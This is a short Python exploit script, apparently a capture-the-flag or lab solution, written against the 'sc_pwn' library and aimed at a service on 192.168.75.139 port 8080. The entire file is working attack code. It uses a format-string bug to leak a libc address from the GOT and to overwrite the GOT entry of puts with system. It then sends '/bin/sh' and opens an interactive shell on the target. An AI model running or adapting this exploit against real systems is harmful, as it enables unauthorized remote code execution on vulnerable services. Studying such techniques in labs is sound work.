#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

addr_got_puts       = 0x0804a01c
addr_got_main       = 0x0804a024
offset_libc_main    = 0x00019990
offset_libc_system  = 0x00040190

str_sh              = '/bin/sh\0'

#==========
def attack(cmn):
    exploit  = pack_32(addr_got_main)
    exploit += '%7$s'
    
    cmn.read_until('>> ')
    cmn.sendln(exploit)
    cmn.read(4)

    addr_libc_base      = unpack_32(cmn.read(4)) - offset_libc_main
    addr_libc_system    = addr_libc_base + offset_libc_system
    info('addr_libc_base    = 0x%08x' % addr_libc_base)
    
    fsb = FSB(size=2)
    fsb.set_adrval(addr_got_puts, addr_libc_system)
    fsb.auto_write(index=7)

    cmn.read_until('>> ')
    cmn.sendln(fsb.get())

    cmn.read_until('>> ')
    cmn.sendln(str_sh)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    
    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
